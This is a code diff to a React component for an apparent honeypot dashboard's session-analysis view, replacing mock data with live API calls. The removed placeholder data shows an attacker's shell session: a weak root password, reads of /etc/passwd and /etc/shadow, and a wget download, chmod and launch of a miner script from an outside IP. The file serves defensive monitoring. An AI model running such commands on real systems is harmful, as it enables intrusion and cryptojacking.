@@ -1,6 +1,49 @@
-﻿import { Terminal, Code, Cpu, Database, Network } from 'lucide-react';
+import { useState, useEffect, useContext } from 'react';
+import { Terminal, Code, Cpu, Database, Network } from 'lucide-react';
+import axios from 'axios';
+import { AuthContext } from '../context/AuthContext';
 
 const SessionAnalysis = () => {
+  const { token } = useContext(AuthContext) || {};
+  const [activeSession, setActiveSession] = useState<any>(null);
+  const [terminalLogs, setTerminalLogs] = useState<any[]>([]);
+
+  useEffect(() => {
+    const fetchSessionData = async () => {
+      try {
+        const sessionsRes = await axios.get('http://localhost:3001/api/sessions', {
+          headers: { Authorization: `Bearer ${token}` }
+        });
+        
+        if (sessionsRes.data.length > 0) {
+          const session = sessionsRes.data[0];
+          setActiveSession(session);
+          
+          const terminalRes = await axios.get(`http://localhost:3001/api/sessions/${session.sessionId}/terminal`, {
+            headers: { Authorization: `Bearer ${token}` }
+          });
+          setTerminalLogs(terminalRes.data);
+        }
+      } catch (err) {
+        console.error('Failed to fetch session analysis data', err);
+      }
+    };
+    if (token) fetchSessionData();
+  }, [token]);
+
+  if (!activeSession) {
+    return (
+      <div className="space-y-6">
+        <h2 className="text-2xl font-bold text-[var(--color-text-main)] flex items-center gap-2">
+          <Terminal className="text-[var(--color-primary)]" /> Session Analysis
+        </h2>
+        <div className="glass-panel p-12 text-center text-[var(--color-text-muted)]">
+          No attacker sessions found to analyze. Run the attack simulator.
+        </div>
+      </div>
+    );
+  }
+
   return (
     <div className="space-y-6">
       <div className="shrink-0">
@@ -17,19 +60,19 @@ const SessionAnalysis = () => {
             <div className="space-y-3">
               <div className="flex justify-between border-b border-[var(--color-border-glass)] pb-2">
                 <span className="text-[var(--color-text-muted)] text-sm">Session ID</span>
-                <span className="text-[var(--color-text-main)] text-sm font-mono">sess_9a8b7c6d</span>
+                <span className="text-[var(--color-text-main)] text-sm font-mono">{activeSession.sessionId}</span>
               </div>
               <div className="flex justify-between border-b border-[var(--color-border-glass)] pb-2">
                 <span className="text-[var(--color-text-muted)] text-sm">Attacker IP</span>
-                <span className="text-[var(--color-text-main)] text-sm font-mono">185.15.58.221</span>
+                <span className="text-[var(--color-text-main)] text-sm font-mono">{activeSession.attackerIp}</span>
               </div>
               <div className="flex justify-between border-b border-[var(--color-border-glass)] pb-2">
                 <span className="text-[var(--color-text-muted)] text-sm">Target Honeypot</span>
-                <span className="text-[var(--color-text-main)] text-sm">Fake SSH Server</span>
+                <span className="text-[var(--color-text-main)] text-sm">{activeSession.targetHoneypot}</span>
               </div>
               <div className="flex justify-between pb-2">
-                <span className="text-[var(--color-text-muted)] text-sm">Duration</span>
-                <span className="text-[var(--color-text-main)] text-sm">14m 23s</span>
+                <span className="text-[var(--color-text-muted)] text-sm">Started</span>
+                <span className="text-[var(--color-text-main)] text-sm">{new Date(activeSession.startTime).toLocaleTimeString()}</span>
               </div>
             </div>
           </div>
@@ -39,24 +82,24 @@ const SessionAnalysis = () => {
               <Cpu size={20} className="text-[var(--color-primary)]" /> AI Summary
             </h3>
             <p className="text-sm text-[var(--color-text-muted)] leading-relaxed">
-              Attacker successfully authenticated using compromised credentials (root/admin123). 
-              Once logged in, they attempted to download a script via wget, change file permissions, 
-              and execute a cryptocurrency miner. The honeypot isolated the execution and fed fake CPU stats back to the attacker.
+              {activeSession.aiSummary || 'AI Analysis is pending...'}
             </p>
           </div>
           
           <div className="glass-panel p-6">
             <h3 className="text-lg font-bold text-[var(--color-text-main)] mb-4">Files Accessed</h3>
             <ul className="space-y-2 font-mono text-sm">
-              <li className="flex items-center gap-2 text-[var(--color-text-muted)] hover:text-[var(--color-text-main)] transition-colors cursor-pointer">
-                <Database size={14} /> /etc/passwd
-              </li>
-              <li className="flex items-center gap-2 text-[var(--color-text-muted)] hover:text-[var(--color-text-main)] transition-colors cursor-pointer">
-                <Database size={14} /> /etc/shadow
-              </li>
-              <li className="flex items-center gap-2 text-green-400 hover:text-green-300 transition-colors cursor-pointer">
-                <Code size={14} /> /tmp/miner.sh
-              </li>
+              {activeSession.filesAccessed && activeSession.filesAccessed.length > 0 ? (
+                activeSession.filesAccessed.map((f: any, i: number) => (
+                  <li key={i} className={`flex items-center gap-2 transition-colors cursor-pointer ${
+                    f.type === 'script' ? 'text-green-400 hover:text-green-300' : 'text-[var(--color-text-muted)] hover:text-[var(--color-text-main)]'
+                  }`}>
+                    {f.type === 'script' ? <Code size={14} /> : <Database size={14} />} {f.path}
+                  </li>
+                ))
+              ) : (
+                <li className="text-[var(--color-text-muted)] italic">No files accessed yet.</li>
+              )}
             </ul>
           </div>
         </div>
@@ -72,33 +115,16 @@ const SessionAnalysis = () => {
           </div>
           
           <div className="p-6 font-mono text-sm overflow-y-auto custom-scrollbar flex-1 bg-[var(--color-bg-base)]">
-            <div className="text-green-400 mb-2">root@vps-server:~# whoami</div>
-            <div className="text-[var(--color-text-muted)] mb-4">root</div>
+            {terminalLogs.map((log: any, i: number) => (
+              <div key={i} className="mb-4">
+                <div className="text-green-400 mb-1">{log.user}@vps-server:~# {log.command}</div>
+                {log.response && (
+                  <div className="text-[var(--color-text-muted)] whitespace-pre-wrap">{log.response}</div>
+                )}
+              </div>
+            ))}
             
-            <div className="text-green-400 mb-2">root@vps-server:~# cat /etc/os-release</div>
-            <div className="text-[var(--color-text-muted)] mb-4">
-              PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"<br/>
-              NAME="Debian GNU/Linux"<br/>
-              VERSION_ID="11"<br/>
-              VERSION="11 (bullseye)"
-            </div>
-            
-            <div className="text-green-400 mb-2">root@vps-server:~# wget http://185.15.58.221/miner.sh -O /tmp/miner.sh</div>
-            <div className="text-[var(--color-text-muted)] mb-4">
-              --2026-07-12 22:45:12--  http://185.15.58.221/miner.sh<br/>
-              Connecting to 185.15.58.221:80... connected.<br/>
-              HTTP request sent, awaiting response... 200 OK<br/>
-              Length: 1452 (1.4K) [application/x-sh]<br/>
-              Saving to: '/tmp/miner.sh'
-            </div>
-            
-            <div className="text-green-400 mb-2">root@vps-server:~# chmod +x /tmp/miner.sh</div>
-            <div className="text-[var(--color-text-muted)] mb-4"></div>
-            
-            <div className="text-green-400 mb-2">root@vps-server:~# ./tmp/miner.sh &</div>
-            <div className="text-[var(--color-text-muted)] mb-4">[1] 14892</div>
-            
-            <div className="text-green-400 mb-2 animate-pulse">root@vps-server:~# â–ˆ</div>
+            <div className="text-green-400 mb-2 animate-pulse">root@vps-server:~# █</div>
           </div>
         </div>
       </div>
